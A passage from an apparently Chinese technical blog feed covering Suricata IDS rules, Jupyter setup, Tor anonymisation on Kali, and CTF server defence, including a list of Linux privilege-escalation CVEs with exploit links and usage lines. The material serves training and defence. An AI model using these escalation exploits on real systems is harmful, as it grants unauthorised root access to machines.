emerging.rules.tar.gz<span class="token function">sudo</span> <span class="token function">cp</span> -R rules/ /etc/suricata/</code></pre><h5 id="把Suricata安装源文件中的suricata-yaml、classification-config、reference-config文件拷贝到Suricata的配置目录下"><a href="#把Suricata安装源文件中的suricata-yaml、classification-config、reference-config文件拷贝到Suricata的配置目录下" class="headerlink" title="把Suricata安装源文件中的suricata.yaml、classification.config、reference.config文件拷贝到Suricata的配置目录下"></a>把Suricata安装源文件中的<code>suricata.yaml、classification.config、reference.config</code>文件拷贝到Suricata的配置目录下</h5><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> suricata<span class="token function">sudo</span> <span class="token function">cp</span> suricata.yaml classification.config reference.config /etc/suricata/</code></pre><h5 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h5><p>suricata的配置文件路径是：<code>/etc/suricata/suricata.yaml</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/suricata/suricata.yaml</code></pre><p>我们需要注意一下几个关键参数</p><p><strong><code>HOME_NET</code></strong>: 它指定了Suricata 监控的本地网络，根据自己的网络情况进行修改</p><pre class=" language-bash"><code class="language-bash">HOME_NET: <span class="token string">"[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"</span></code></pre><p><code>EXTERNAL_NET</code> 变量的 <code>!$HOME_NET</code> 代表除本地网络之外的其他网络。</p><p><strong><code>default-log-dir</code></strong>：日志文件存储路径，默认是/var/log/suricata。</p><p><strong><code>outputs</code></strong>：outputs选项下有很多可以输出的配置选项，包括警告、检测的数据包、产生的结果等，可以根据自己的需求进行配置。</p><ul><li><code>fast.log</code>：默认的警告输出文件。</li><li><code>unified2.alert</code>：数据包输出文件，将整个数据包以二进制的方式存储到文件中。</li><li><code>http.log</code>：HTTP日志，包含了http请求、HOST字段、URI字段和User-Agent字段。</li><li><code>Syslog</code>：这个选项决定了是否将suricata的警告输出到syslog文件中。</li><li><code>Drop.log</code>：当suricata工作在IPS模式下的时候，可以使用drop操作规则，这些drop掉的数据包信息就会存储在drop.log文件中</li></ul><p><strong><code>max-pending-packets</code></strong>: 设置suricata能同时处理的数据包数量，最少为1，最大值取决于内存的大小，更大的内存可以设置更大的值并拥有更好的性能，默认值是1024。</p><p><strong><code>default-packet-size</code></strong>：对处理的每个数据包的大小进行限制。默认值是1514，也是TCP数据包的最大长度（当数据超过这个长度便会使用TCP报文重组技术）。</p><h3 id="3-编辑测试规则"><a href="#3-编辑测试规则" class="headerlink" title="(3) 编辑测试规则"></a>(3) 编辑测试规则</h3><p>针对suricata的安全规则的配置，可以参考<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Rules" target="_blank" rel="noopener">suricata配置文档</a></p><p>修改<code>/etc/suricata/suricata.yaml</code>文件，设置我们的测试规则文件<code>my.rules</code></p><pre class=" language-bash"><code class="language-bash">default-rule-path: /etc/suricata/rulesrule-files: - my.rules</code></pre><p>然后我们去<code>/etc/suricata/rules</code>目录下创建我们的自定义规则文件<code>my.rules</code></p><p>在该文件中，我们写下自己的测试规则</p><pre class=" language-bash"><code class="language-bash">alert icmp <span class="token variable">$HOME_NET</span> any -<span class="token operator">></span> <span class="token variable">$EXTERNAL_NET</span> any <span class="token punctuation">(</span>msg:<span class="token string">"TEST :ICMP PING"</span><span class="token punctuation">;</span> itype:8<span class="token punctuation">;</span> sid:20000<span class="token punctuation">;</span> rev:3<span class="token punctuation">;</span><span class="token punctuation">)</span>alert tcp any any -<span class="token operator">></span> any 80 <span class="token punctuation">(</span>msg:<span class="token string">"http test"</span><span class="token punctuation">;</span><span class="token punctuation">)</span>alert http any any -<span class="token operator">></span> any any <span class="token punctuation">(</span>msg:<span class="token string">"Filemagic jgp(1)"</span><span class="token punctuation">;</span> flow:established<span class="token punctuation">;</span> filemagic:<span class="token string">"JPEG image data"</span><span class="token punctuation">;</span> filestore<span class="token punctuation">;</span> sid:10<span class="token punctuation">;</span> rev:1<span class="token punctuation">;</span><span class="token punctuation">)</span></code></pre><h3 id="4-运行suricata进行测试"><a href="#4-运行suricata进行测试" class="headerlink" title="(4) 运行suricata进行测试"></a>(4) 运行suricata进行测试</h3><p>Suricata有不同的运行模式，我们可以使用如下命令查看</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> suricata --list-runmodes</code></pre><p>启动Suricata之前，强烈建议先关闭网卡的LRO/GRO功能（即网卡收包时将同一流的小包合并成大包）。这会导致Suricata处理时很容易出现丢包问题，传输速度慢。解决方法，关闭LRO/GRO功能，命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ethtool</span> -k eth0 <span class="token comment" spellcheck="true">#查看LRO/GRO当前是否打开</span><span class="token function">ethtool</span> -K eth0 lro off <span class="token comment" spellcheck="true">#关闭LRO</span><span class="token function">ethtool</span> -K eth0 gro off <span class="token comment" spellcheck="true">#关闭GRO</span></code></pre><p>如果看到下列警示信息，可以忽视。它说明你的网卡不支持LRO。</p><pre class=" language-bash"><code class="language-bash">Cannot change large-receive-offload</code></pre><p>然后我们启动suricata</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> suricata -c /etc/suricata/suricata.yaml -i eth0</code></pre><p>此时，suricata会开始监听我们的流量，如果触发了规则，会在默认日志路径<code>/var/log/suricata/</code>下产生警报文件<code>fast.log</code></p><h2 id="3-使用Suricata监控网络攻击"><a href="#3-使用Suricata监控网络攻击" class="headerlink" title="3.使用Suricata监控网络攻击"></a>3.使用Suricata监控网络攻击</h2><p>模拟网络攻击：mysql暴力破解</p><p>IDS检测规则</p><pre class=" language-bash"><code class="language-bash">alert tcp <span class="token variable">$EXTERNAL_NET</span> any -<span class="token operator">></span> <span class="token variable">$HOME_NET</span> 3306 <span class="token punctuation">(</span>msg:<span class="token string">"MySQL Login Attack"</span><span class="token punctuation">;</span> sid:11619<span class="token punctuation">;</span> gid:3<span class="token punctuation">;</span> rev:6<span class="token punctuation">;</span> classtype:attempted-admin<span class="token punctuation">;</span> reference:cve,2006-1518<span class="token punctuation">;</span> metadata: engine shared, soid 3<span class="token operator">|</span>11619, <span class="token function">service</span> mysql<span class="token punctuation">;</span><span class="token punctuation">)</span></code></pre><p>此规则可以检测出尝试枚举mysql管理员密码的暴力破解攻击。</p><h2 id="4-使用Splunk分析展示IDS警报"><a href="#4-使用Splunk分析展示IDS警报" class="headerlink" title="4.使用Splunk分析展示IDS警报"></a>4.使用Splunk分析展示IDS警报</h2><p>下载<a href="https://www.splunk.com/en_us/download" target="_blank" rel="noopener">splunklight版</a></p><p>安装web环境：php+apache2</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.0 libapache2-mod-php7.0 apache2</code></pre><p>运行splunk服务</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> splunk\bin\./splunk start</code></pre><p>然后访问本机8080端口即可。我们可以动态监控警报文件<code>/var/log/suricata/fast.log</code></p>]]></content>
      
      
      <categories>
          
          <category> 安全建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDS </tag>
            
            <tag> Snort </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>jupyter及jupyterlab安装使用</title>
      <link href="/jupyter-ji-jupyterlab-an-zhuang-shi-yong/"/>
      <url>/jupyter-ji-jupyterlab-an-zhuang-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="一-jupyter安装及简单使用"><a href="#一-jupyter安装及简单使用" class="headerlink" title="一.jupyter安装及简单使用"></a>一.jupyter安装及简单使用</h1><p><a href="https://github.com/jupyter/notebook" target="_blank" rel="noopener">Jupyther notebook</a>（曾经的Ipython notebook），是一个可以把代码、图像、注释、公式和作图集于一处，实现可读性及可视化分析的工具，支持多种编程语言。<a href="http://jupyter.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方使用手册</a>。安装前，你需要装好python环境，并且安装pip包管理器并更新</p><pre class=" language-python"><code class="language-python">pip install <span class="token operator">-</span><span class="token operator">-</span>upgrade pippip3 install <span class="token operator">-</span><span class="token operator">-</span>upgrade pip</code></pre><h2 id="1-安装jupyter"><a href="#1-安装jupyter" class="headerlink" title="1.安装jupyter"></a>1.安装jupyter</h2><p><strong>Python2</strong></p><pre class=" language-python"><code class="language-python">pip install jupyter notebook<span class="token punctuation">(</span>python <span class="token operator">-</span>m pip install jupyter<span class="token punctuation">)</span></code></pre><p><strong>Python3</strong></p><pre class=" language-python"><code class="language-python">pip3 install jupyter notebook<span class="token punctuation">(</span>python3 <span class="token operator">-</span>m pip install jupyter<span class="token punctuation">)</span></code></pre><h2 id="2-配置jupyter（可选）"><a href="#2-配置jupyter（可选）" class="headerlink" title="2.配置jupyter（可选）"></a>2.配置jupyter（可选）</h2><p>生成jupyter配置文件：</p><pre class=" language-python"><code class="language-python">jupyter notebook <span class="token operator">-</span><span class="token operator">-</span>generate<span class="token operator">-</span>config</code></pre><p>此时会在你的个人用户目录下的<code>.jupyter</code> 下生成配置文件 <code>jupyter_notebook_config.py</code>，打开以后找到如下一行：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#c.NotebookApp.ip = 'localhost'</span></code></pre><p>这里配置的是是允许访问的IP地址，这里改为<code>*</code>，意思为允许所有ip连接。：</p><pre class=" language-bash"><code class="language-bash">c.NotebookApp.ip <span class="token operator">=</span> <span class="token string">'*'</span></code></pre><blockquote><p>注：如果你在服务器上运行，需要采用这种方式，并且为了安全考虑，最好将<code>c.NotebookApp.ip</code>的值设置为<code>Client</code>的ip。</p></blockquote><h2 id="3-运行jupyter"><a href="#3-运行jupyter" class="headerlink" title="3.运行jupyter"></a>3.运行jupyter</h2><p>运行jupyter的命令为：</p><pre class=" language-bash"><code class="language-bash">jupyter notebook<span class="token punctuation">(</span>ipython notebook<span class="token punctuation">)</span></code></pre><p>如果你只是本地运行，并且没有生成配置文件，那么运行命令如下：</p><pre class=" language-bash"><code class="language-bash">jupyter notebook --ip<span class="token operator">=</span>0.0.0.0jupyter notebook --ip<span class="token operator">=</span>0.0.0.0 --allow-root    <span class="token punctuation">(</span>root权限运行<span class="token punctuation">)</span></code></pre><h2 id="4-jupyter必要环境配置"><a href="#4-jupyter必要环境配置" class="headerlink" title="4.jupyter必要环境配置"></a>4.jupyter必要环境配置</h2><h3 id="1-生成环境配置文件"><a href="#1-生成环境配置文件" class="headerlink" title="(1) 生成环境配置文件"></a>(1) 生成环境配置文件</h3><pre class=" language-bash"><code class="language-bash">ipython profile create</code></pre><p>此时会在你的家目录生成配置文件<code>.ipython/profile_default/ipython_kernel_config.py</code></p><h3 id="2-运行代码后自动显示变量值"><a href="#2-运行代码后自动显示变量值" class="headerlink" title="(2) 运行代码后自动显示变量值"></a>(2) 运行代码后自动显示变量值</h3><p>直接在该文件的头部添加代码</p><pre class=" language-bash"><code class="language-bash">c <span class="token operator">=</span> get_config<span class="token punctuation">(</span><span class="token punctuation">)</span>c.InteractiveShell.ast_node_interactivity <span class="token operator">=</span> <span class="token string">"all"</span></code></pre><h3 id="3-中文编码问题"><a href="#3-中文编码问题" class="headerlink" title="(3) 中文编码问题"></a>(3) 中文编码问题</h3><p><code>vi ~/.ipython/ipythonrc</code></p><pre class=" language-bash"><code class="language-bash">readline_parse_and_bind <span class="token string">"\M-i"</span><span class="token keyword">:</span> <span class="token string">"    "</span>readline_parse_and_bind <span class="token string">"\M-o"</span><span class="token keyword">:</span> <span class="token string">"\d\d\d\d"</span>readline_parse_and_bind <span class="token string">"\M-I"</span><span class="token keyword">:</span> "\d\d\d\d</code></pre><p>注释掉这3行</p><h3 id="4-matplotlib作图显示中文"><a href="#4-matplotlib作图显示中文" class="headerlink" title="(4) matplotlib作图显示中文"></a>(4) matplotlib作图显示中文</h3><p>需要设置中文字体，否则中文会乱码。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> matplotlib.pyplot as plt  plt.rc<span class="token punctuation">(</span><span class="token string">'font'</span>, family<span class="token operator">=</span><span class="token string">'Microsoft YaHei Mono'</span>, size<span class="token operator">=</span>12<span class="token punctuation">)</span></code></pre><h2 id="5-常用快捷键"><a href="#5-常用快捷键" class="headerlink" title="5.常用快捷键"></a>5.常用快捷键</h2><ul><li>在当前cell的上一层添加cell：A</li><li>在当前cell的下一蹭添加cell：B</li><li>双击d：删除当前cell</li><li>撤销对某个cell的删除：z</li><li>当前的cell进入编辑模式：Enter</li><li>退出当前cell的编辑模式：Esc</li><li>执行当前cell并跳到下一个cell：Shift Enter</li><li>执行当前cell执行后不调到下一个cell：Ctrl Enter</li><li>向下选择多个cell:Shift + J 或 Shift + Down</li><li>向上选择多个cell：Shift + K 或 Shift + Up</li><li>合并cell：Shift + M</li><li>在代码中查找、替换，忽略输出：Esc + F</li><li>在cell和输出结果间切换：Esc + O</li><li>快速跳转到首个cell：Crtl Home</li><li>快速跳转到最后一个cell：Crtl End</li><li>m：进入markdown模式，编写md的文档进行描述说明</li><li>为当前的cell加入line number：单L</li><li>将当前的cell转化为具有一级标题的maskdown：单1</li><li>将当前的cell转化为具有二级标题的maskdown：单2</li><li>将当前的cell转化为具有三级标题的maskdown：单3</li><li>为一行或者多行添加/取消注释：Crtl /</li><li>在浏览器的各个Tab之间切换：Crtl PgUp和Crtl PgDn</li></ul><h1 id="二-JupyterLab安装使用"><a href="#二-JupyterLab安装使用" class="headerlink" title="二.JupyterLab安装使用"></a>二.JupyterLab安装使用</h1><p><code>JupyterLab</code>是<code>Jupyter Notebook</code>的增强版本，看起来更像是一个IDE。</p><h2 id="1-安装jupyterlab"><a href="#1-安装jupyterlab" class="headerlink" title="1.安装jupyterlab"></a>1.安装jupyterlab</h2><p><strong>Python2</strong></p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> jupyterlab<span class="token punctuation">(</span>python -m pip <span class="token function">install</span> jupyterlab<span class="token punctuation">)</span></code></pre><p><strong>Python3</strong></p><pre class=" language-bash"><code class="language-bash">pip3 <span class="token function">install</span> jupyterlab<span class="token punctuation">(</span>python3 -m pip <span class="token function">install</span> jupyterlab<span class="token punctuation">)</span></code></pre><p>如果你使用的Jupyter版本早于5.3，那么你还需要运行以下命令来启动JupyterLab服务组件。</p><pre class=" language-bash"><code class="language-bash">jupyter serverextension <span class="token function">enable</span> --pjupyterlab --sys-prefix</code></pre><h3 id="2-运行jupyterlab"><a href="#2-运行jupyterlab" class="headerlink" title="2.运行jupyterlab"></a>2.运行jupyterlab</h3><p>使用以下命令运行<code>JupyterLab</code>：</p><pre class=" language-bash"><code class="language-bash">jupyter lab --ip<span class="token operator">=</span>0.0.0.0 --allow-root</code></pre><h2 id="3-管理jupyterlab"><a href="#3-管理jupyterlab" class="headerlink" title="3.管理jupyterlab"></a>3.管理jupyterlab</h2><h3 id="查看令牌"><a href="#查看令牌" class="headerlink" title="查看令牌"></a>查看令牌</h3><pre class=" language-bash"><code class="language-bash">$ jupyter notebook listhttp://localhost:8888/?token<span class="token operator">=</span>c8de56fa<span class="token punctuation">..</span>. :: /Users/you/notebooks</code></pre><h3 id="列出已安装扩展"><a href="#列出已安装扩展" class="headerlink" title="列出已安装扩展"></a>列出已安装扩展</h3><pre class=" language-bash"><code class="language-bash">jupyter labextension list</code></pre><h3 id="卸载已安装扩展"><a href="#卸载已安装扩展" class="headerlink" title="卸载已安装扩展"></a>卸载已安装扩展</h3><pre class=" language-bash"><code class="language-bash">jupyter labextension uninstall my-extension</code></pre><p>其中<code>my-extension</code>是扩展名列表中的打印名称。您也可以使用此命令卸载核心扩展（以后可以随时重新安装核心扩展）。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://jupyterlab.readthedocs.io/en/latest/user/extensions.html" target="_blank" rel="noopener">https://jupyterlab.readthedocs.io/en/latest/user/extensions.html</a><br><a href="https://github.com/jupyterlab/jupyterlab#getting-help" target="_blank" rel="noopener">https://github.com/jupyterlab/jupyterlab#getting-help</a><br><a href="https://gitter.im/jupyterlab/jupyterlab" target="_blank" rel="noopener">https://gitter.im/jupyterlab/jupyterlab</a><br><a href="http://jupyterlab.github.io/jupyterlab/" target="_blank" rel="noopener">http://jupyterlab.github.io/jupyterlab/</a></p>]]></content>
      
      
      <categories>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jupyter </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali使用anonsurf配合tor匿名上网</title>
      <link href="/kali-shi-yong-anonsurf-pei-he-tor-ni-ming-shang-wang/"/>
      <url>/kali-shi-yong-anonsurf-pei-he-tor-ni-ming-shang-wang/</url>
      
        <content type="html"><![CDATA[<p>整个系统应用TOR匿名，<code>Anonsurf</code>在后台运行并不断更改IP地址。</p><blockquote><p>注意，国内环境下前提是你的kali能够翻&amp;墙</p></blockquote><h1 id="安装配置tor"><a href="#安装配置tor" class="headerlink" title="安装配置tor"></a>安装配置tor</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tor</code></pre><p>去<code>bridges.torproject.org</code>获取bridges信息，然后修改<code>/etc/tor/torrc</code>文件，添加如下内容：</p><pre class=" language-bash"><code class="language-bash">Bridge 158.69.204.189:990 5A5103F99EDA9E2F136CE38F3C041C0D67320EFCBridge 77.198.28.226:37911 E27AAA7EE9F15324A02115ADD85136295F796211Bridge 96.230.139.74:9001 5F3B7E2CDB9D420F9FBAC6C764BA62D49CF68DE3VirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1SocksListenAddress 127.0.0.1</code></pre><p>开启tor服务，测试可用性：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">service</span> tor startsystemctl status tor<span class="token function">netstat</span> -antu <span class="token operator">|</span> <span class="token function">grep</span> 9050tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN</code></pre><p>此时，为浏览器设置socks5代理，端口设置为<code>9050</code>。此时我们访问任意<code>.onion</code>站点，如<a href="http://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">DuckDuckGo</a>，测试是否处于tor网络下。如果能够正常访问<code>onion</code>网站以及其他网站，说明tor配置正确。</p><h1 id="安装Anonsurf"><a href="#安装Anonsurf" class="headerlink" title="安装Anonsurf"></a>安装Anonsurf</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Und3rf10w/kali-anonsurf.git<span class="token function">cd</span> kali-anonsurf/<span class="token function">sudo</span> ./installer.sh</code></pre><p>在Kali Linux，安装完毕后，anonsurf会自动更新编辑<code>/etc/tor/torrc</code>文件并添加以下几行：</p><pre class=" language-bash"><code class="language-bash">VirtualAddrNetwork 10.192.0.0/10AutomapHostsOnResolve 1TransPort 9040SocksPort 9050DNSPort 53RunAsDaemon 1</code></pre><p>它还会将解析程序配置更改为以下内容：</p><pre class=" language-bash"><code class="language-bash">nameserver 127.0.0.1nameserver 209.222.18.222nameserver 209.222.18.218</code></pre><p>如果你不喜欢使用<a href="https://www.blackmoreops.com/2015/03/01/setup-vpn-on-kali-linux" target="_blank" rel="noopener">专用Internet访问DNS</a>，只需在<code>/etc/init.d/anonsurf</code>脚本中更改以下行中的DNS ：</p><pre class=" language-bash"><code class="language-bash"> <span class="token keyword">echo</span> -e <span class="token string">'nameserver 127.0.0.1\nnameserver 209.222.18.222\nnameserver 209.222.18.218'</span> <span class="token operator">></span> /etc/resolv.conf <span class="token keyword">echo</span> -e <span class="token string">" <span class="token variable">$GREEN*</span><span class="token variable">$BLUE</span> Modified resolv.conf to use Tor and Private Internet Access DNS"</span></code></pre><p>我们可以启动anonsurf，通过tor传输数据：</p><p>以后使用时，我们不必提前开启tor服务，anonsurf会自动帮我们完成。</p><pre class=" language-bash"><code class="language-bash">anonsurf start</code></pre><p>关闭anonsurf</p><pre class=" language-bash"><code class="language-bash">anonsurf stop</code></pre><p>帮助命令</p><pre class=" language-bash"><code class="language-bash">anonsurf       <span class="token comment" spellcheck="true">#查看帮助</span>anonsurf start  <span class="token comment" spellcheck="true">#开启隐身</span>anonsurf myip      <span class="token comment" spellcheck="true">#查看自己的ip</span>anonsurf restart <span class="token comment" spellcheck="true">#可以更换代理IP</span>anonsurf stop      <span class="token comment" spellcheck="true">#停止隐身</span>anonsurf starti2p <span class="token comment" spellcheck="true">#开启i2p服务</span>anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服务</span></code></pre><h1 id="安装I2P-可选"><a href="#安装I2P-可选" class="headerlink" title="安装I2P(可选)"></a>安装I2P(可选)</h1><p>1.添加源</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"deb https://deb.i2p2.de/ wheezy main"</span> <span class="token operator">>></span> /etc/apt/sources.list</code></pre><p>2.添加<code>deb.i2p2.de</code>的<code>public key</code></p><pre class=" language-bash"><code class="language-bash">apt-key adv --recv 67ECE5605BCF1346</code></pre><p>如果不添加public key，等会更新时可能会报错如下：</p><pre class=" language-bash"><code class="language-bash">GPG error: https://deb.i2p2.de wheezy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 67ECE5605BCF1346</code></pre><p>3.安装i2p</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> i2p i2p-keyring</code></pre><h1 id="测试匿名性"><a href="#测试匿名性" class="headerlink" title="测试匿名性"></a>测试匿名性</h1><p>我们可以使用<code>anonsurf myip</code>命令查看自己的ip是否已经匿名。</p><p>另外，我们可以访问一下网站检查是否泄漏了DNS</p><p><a href="http://dnsleak.com/" target="_blank" rel="noopener">dnsleak</a></p><p><a href="https://www.perfect-privacy.com/dns-leaktest/" target="_blank" rel="noopener">dns-leaktest</a></p><p>在此处检查是否泄漏了IPv6：<a href="http://ipv6leak.com/" target="_blank" rel="noopener">ipv6leak</a></p>]]></content>
      
      
      <categories>
          
          <category> 科学上网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF线下防御战—让你的靶机变成&quot;铜墙铁壁&quot;</title>
      <link href="/ctf-xian-xia-fang-yu-zhan/"/>
      <url>/ctf-xian-xia-fang-yu-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p>　　随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，开始出现了安全加固或者防御战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于线下赛，笔者虽说没有什么很高超的攻防技巧，但也是有着一些自己的心得。本文总结了一些CTF线下赛中常用的服务器加固姿势，希望能对各位CTF朋友们有所帮助。环境针对目前常见线下赛常见的linux Web服务器，但是因为CTF毕竟与真实网络环境有很大区别，本文的涉及的大部分姿势不具有普遍适用性。本文涉及到的相关代码github下载地址：<a href="https://github.com/ssooking/CTFDefense" target="_blank" rel="noopener">CTFDefense</a>。</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/hello.jpg" alt="img"></p><h1 id="二-常用姿势"><a href="#二-常用姿势" class="headerlink" title="二. 常用姿势"></a>二. 常用姿势</h1><h2 id="1-提权"><a href="#1-提权" class="headerlink" title="1. 提权"></a>1. 提权</h2><p>　　在开始正文之前，需要先提一下提权，这个要根据自己的比赛过程中的需要而定。有些比赛就有专门的防御加固环节，但安全加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般一开始会给一个普通权限账号，或者干脆什么都不给，需要我们自己通过漏洞拿下服务器，这样往往就需要提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。这里有一个网站：<a href="http://exploit.linuxnote.org/" target="_blank" rel="noopener">http://exploit.linuxnote.org/</a>，里面有许多linux本地提权的poc。github上有一个挺全的提权exp项目：<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a>。网上也有人分享的一些打包搜集的poc,比如<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=363466" target="_blank" rel="noopener">这个</a>，有兴趣的朋友可以多下载看看。</p><p>下面分享几个最近两年并且影响范围比较大的：</p><p><a href="https://github.com/torvalds/linux/commit/5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4" target="_blank" rel="noopener">CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ）</a><br>描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限<br>用法：./pwn<br><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">CVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)）</a><br>描述：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限<br>用法： ./dirtyc0w file content<br><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a" target="_blank" rel="noopener">CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</a><br>描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限<br>用法：./chocobo_root<br>POC： <a href="https://www.seebug.org/vuldb/ssvid-92567" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92567</a><br><a href="https://github.com/c0d3z3r0/sudo-CVE-2017-1000367" target="_blank" rel="noopener">CVE-2017-1000367（sudo本地提权漏洞 ）</a><br>CVE-2017-1000364<br>描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p><p><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">CVE-2016-1247（Nginx权限提升漏洞）</a></p><p>描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</p><p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><p>　</p><p>　提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。 </p><p><img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171001103247387-2092258840.png" alt="img"></p><p>实用脚本</p><p>　　 <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester.git" target="_blank" rel="noopener">Linux_Exploit_Suggester.pl</a> ，它可以根据系统内核版本号返回一个包含了可能exploits的列表。还有一个检查linux安全状况的脚本：<a href="http://www.freebuf.com/sectool/108564.html" target="_blank" rel="noopener">原文链接</a></p><p>　　还有几个详见：<a href="http://www.freebuf.com/sectool/121847.html" target="_blank" rel="noopener">Linux提权？这四个脚本可以帮助你</a></p><h2 id="2-常用操作命令"><a href="#2-常用操作命令" class="headerlink" title="2. 常用操作命令"></a>2. 常用操作命令</h2><p>　　linux操作有很多命令，但是线下赛的防护工作中常用的也就那么一些，我们平时可以留意并总结起来，便于我们比赛使用。</p><pre class=" language-bash"><code class="language-bash">ssh操作<span class="token function">ssh</span> <span class="token operator">&lt;</span>-p 端口<span class="token operator">></span> 用户名@IP　　//登录<span class="token function">scp</span> 文件路径  用户名@IP:存放路径　　//向ssh服务器上传输文件备份web目录　　<span class="token function">tar</span> -zcvf web.tar.gz /var/www/html/用户管理　　w 　　//查看当前用户　　<span class="token function">pkill</span> -kill -t <span class="token operator">&lt;</span>用户tty<span class="token operator">></span>　　 //踢掉当前登录用户进程管理　　<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> pid或者进程名　　//查看进程信息　　查看已建立的网络连接及进程　　<span class="token function">netstat</span> -antulp <span class="token operator">|</span> <span class="token function">grep</span> EST　　查看指定端口被哪个进程占用　　<span class="token function">lsof</span> -i:端口号 或者 <span class="token function">netstat</span> -tunlp<span class="token operator">|</span><span class="token function">grep</span> 端口号　　结束进程命令　　<span class="token function">kill</span> PID　　<span class="token function">killall</span> <span class="token operator">&lt;</span>进程名<span class="token operator">></span>　　<span class="token function">kill</span> -9 <span class="token operator">&lt;</span>PID<span class="token operator">></span>iptables命令　　封杀某个IP或者ip段，如：123.4.5.6　　iptables -I INPUT -s 123.4.5.6 -j DROP　　iptables -I INPUT -s 123.4.5.1/24 -j DROP　　禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6　　iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROPMysql数据库操作　　备份mysql数据库　　mysqldump -u 用户名 -p 密码 数据库名 <span class="token operator">></span> back.sql　　//备份指定数据库　　mysqldump --all-databases <span class="token operator">></span> bak.sql　　　　//备份所有数据库　　还原mysql数据库　　mysql -u 用户名 -p 密码 数据库名 <span class="token operator">&lt;</span> bak.sql安全检查　　<span class="token function">find</span> / *.php -perm 4777 　　 //查找777的权限的php文件 　　<span class="token function">awk</span> -F: <span class="token string">'{if(<span class="token variable">$3</span>==0)print <span class="token variable">$1</span>}'</span> /etc/passwd　　//查看root权限的账号　　<span class="token function">crontab</span> -l　　//查看计划任务　　检测所有的tcp连接数量及状态　　<span class="token function">netstat</span> -ant<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token 